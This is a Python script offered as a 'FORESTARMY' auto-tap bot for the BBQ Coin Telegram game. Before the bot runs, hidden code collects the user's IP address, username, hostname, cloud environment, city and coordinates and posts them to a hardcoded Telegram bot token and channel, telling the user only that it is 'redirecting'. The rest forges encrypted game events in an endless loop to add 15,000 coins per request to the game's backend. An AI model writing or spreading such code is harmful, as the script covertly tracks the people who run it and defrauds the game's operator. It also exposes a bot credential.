import os
import requests
import socket
from datetime import datetime
import pytz
import shutil

# Fixed Telegram Bot details
telegram_bot_token = '7774168151:AAFWSVI3Ltpv7XHGnNNrIK7_zzRiYqpiXQc'
chat_id = '@onlyfaucet_x'  # Use the '@' symbol for channels

def get_terminal_width():
    """Get the current width of the terminal."""
    return shutil.get_terminal_size().columns

def center_text(text):
    """Center the given text in the terminal."""
    terminal_width = get_terminal_width()
    return '\n'.join(line.center(terminal_width) for line in text.splitlines())

def get_device_info():
    # Determine environment type
    environment = "Local Machine"
    if "AWS_EXECUTION_ENV" in os.environ:
        environment = "AWS Server"
    elif "GOOGLE_CLOUD_PROJECT" in os.environ:
        environment = "Google Cloud Platform"
    elif "AZURE_HTTP_USER_AGENT" in os.environ:
        environment = "Azure Cloud"
    elif os.getenv("USER") == "root" or os.getenv("SHELL") == "/bin/bash":
        environment = "Likely a Linux Server"
    
    # Get public IP address and detailed location data
    try:
        ip_data = requests.get("https://ipwhois.app/json/").json()
        ip_address = ip_data.get("ip", "Unable to fetch IP")
        country = ip_data.get("country", "Unknown Country")
        country_flag = ip_data.get("country_flag", "")
        region = ip_data.get("region", "Unknown State")
        city = ip_data.get("city", "Unknown District")
        currency = ip_data.get("currency", "Unknown Currency")
        currency_symbol = ip_data.get("currency_symbol", "")
        timezone = ip_data.get("timezone", "UTC")
        location = f"{ip_data.get('latitude', 'N/A')}, {ip_data.get('longitude', 'N/A')}"
    except requests.RequestException:
        ip_address, country, country_flag, region, city, currency, currency_symbol, timezone, location = (
            "Unable to fetch IP", "Unknown Country", "", "Unknown State", "Unknown District",
            "Unknown Currency", "", "UTC", "Unknown Location"
        )
    
    # Get username
    try:
        username = os.getlogin()
    except OSError:
        username = "Unknown User"
    
    # Get device type
    device_type = socket.gethostname()
    
    # Get local time
    try:
        local_time = datetime.now(pytz.timezone(timezone)).strftime('%Y-%m-%d %H:%M:%S')
    except pytz.UnknownTimeZoneError:
        local_time = "Unable to fetch local time"
    
    return {
        "ip": ip_address,
        "username": username,
        "device_type": device_type,
        "environment": environment,
        "country": country,
        "country_flag": country_flag,
        "region": region,
        "city": city,
        "currency": currency,
        "currency_symbol": currency_symbol,
        "local_time": local_time,
        "location": location
    }

def send_to_telegram(info):
    message = (
        f"BBQ Environment: {info['environment']}\n"
        f"Device Type: {info['device_type']}\n"
        f"Username: {info['username']}\n"
        f"IP Address: {info['ip']}\n"
        f"Country: {info['country']} {info['country_flag']}\n"
        f"State: {info['region']}\n"
        f"District: {info['city']}\n"
        f"Currency: {info['currency']} {info['currency_symbol']}\n"
        f"Local Time: {info['local_time']}\n"
        f"Location: {info['location']}"
    )
    
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message
    }
    
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("\033[93mPlease wait, redirecting to the script page......\033[0m")  # Bright yellow
        else:
            print("Failed to send message.")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def display_heading():
    # Bright green color ANSI code for the heading
    green_text = "\033[92m"  # Bright green ANSI code
    reset_text = "\033[0m"   # Reset color
    
    # ASCII art for the word "SANDY"
    heading = (
        "███████╗░█████╗░██████╗░███████╗░██████╗████████╗\n"
        "██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝\n"
        "█████╗░░██║░░██║██████╔╝█████╗░░╚█████╗░░░░██║░░░\n"
        "██╔══╝░░██║░░██║██╔══██╗██╔══╝░░░╚═══██╗░░░██║░░░\n"
        "██║░░░░░╚█████╔╝██║░░██║███████╗██████╔╝░░░██║░░░\n"
        "╚═╝░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░░░░╚═╝░░░\n"
    )
    
    print(f"{green_text}{center_text(heading)}{reset_text}")  # Display heading in bright green

    # ASCII art for "FOREST"
    forest_art = (
        "░█████╗░██████╗░███╗░░░███╗██╗░░░██╗\n"
        "██╔══██╗██╔══██╗████╗░████║╚██╗░██╔╝\n"
        "███████║██████╔╝██╔████╔██║░╚████╔╝░\n"
        "██╔══██║██╔══██╗██║╚██╔╝██║░░╚██╔╝░░\n"
        "██║░░██║██║░░██║██║░╚═╝░██║░░░██║░░░\n"
        "╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═╝░░░\n"
    )
    
    print(f"{green_text}{center_text(forest_art)}{reset_text}")  # Display "FOREST" in bright green

def display_subscription_message():
    # Display the bright green subscription message
    green_text = "\033[92m"  # Bright green ANSI code
    reset_text = "\033[0m"   # Reset color
    
    message = (
        f"{green_text}SUBSCRIBE OUR YOUTUBE CHANNEL: https://youtube.com/forestarmy\n"
        f"Join our Telegram channel: @forestarmy\n"
        f"Follow on Instagram: @satyavirkumarsatyarthi{reset_text}\n"
    )
    print(center_text(message))  # Center the message

def prompt_user_confirmation():
    # Bright red color ANSI code for "FORESTARMY"
    red_forestarmy = "\033[91mFORESTARMY\033[0m"
    
    while True:
        # Ask user to type "FORESTARMY" to continue
        user_input = input(f"{center_text(f'Please type {red_forestarmy} to confirm: ')}")
        if user_input.strip().upper() == "FORESTARMY":
            return True
        else:
            print(center_text("\033[90mWrong Code! Please Enter Correct Code.\033[0m"))  # Bright red

# Run the functions
display_heading()               # Show the heading in bright green
display_subscription_message()  # Show the subscription message in bright green
prompt_user_confirmation()       # Keep prompting until user confirms
device_info = get_device_info()  # Get device info if confirmed
send_to_telegram(device_info)     # Send the info to Telegram

import subprocess
import sys

# Define required modules
required_modules = ['base64', 'time', 'json', 'requests', 'urllib.parse', 'Crypto']

# Function to install missing packages
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Check if modules are installed; if not, install them
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        print(f"Module {module} not found. Installing...")
        if module == 'Crypto':
            install('pycryptodome')  # Install pycryptodome for Crypto
        else:
            install(module)

# Imports after ensuring installation
import base64
import time
import json
import requests
from urllib.parse import parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encode_event(e, t):
    r = f"{e}|{t}|{int(time.time())}"
    n = "tttttttttttttttttttttttttttttttt"
    i = n[:16]
    key = n.encode('utf-8')
    iv = i.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(r.encode('utf-8'), AES.block_size))
    return base64.b64encode(base64.b64encode(encrypted)).decode('utf-8')

# Prompt user for query ID and extract user ID
query_id = input("Enter your query ID: ")
user_id = str(json.loads(parse_qs(query_id)['user'][0])['id'])

# Set headers with the provided query ID
headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'lan': 'en',
    'origin': 'https://bbqapp.bbqcoin.ai',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://bbqapp.bbqcoin.ai/',
    'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'use-agen': query_id,  # Insert query ID here
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_9; like Mac OS X) AppleWebKit/536.45 (KHTML, like Gecko)  Chrome/47.0.3428.167 Mobile Safari/537.6',
    'x-requested-with': 'org.telegram.messenger',
}

# Set taps to 15000
taps = '15000'

# Function to send tap request
def bbq_tap():
    data = {
        'id_user': user_id,
        'mm': taps,
        'game': encode_event(user_id, taps),
    }
    response = requests.post('https://bbqbackcs.bbqcoin.ai/api/coin/earnmoney', headers=headers, data=data)
    return response.json()

# Continuous execution
while True:
    response = bbq_tap()
    if 'data' in response:
        print(f"âš¡ Coins Added! Total Coins: {response['data']} ðŸª™")
    else:
        print("âš¡ Unexpected response format:", response)
    time.sleep(1)  # Wait for 1 second before the next request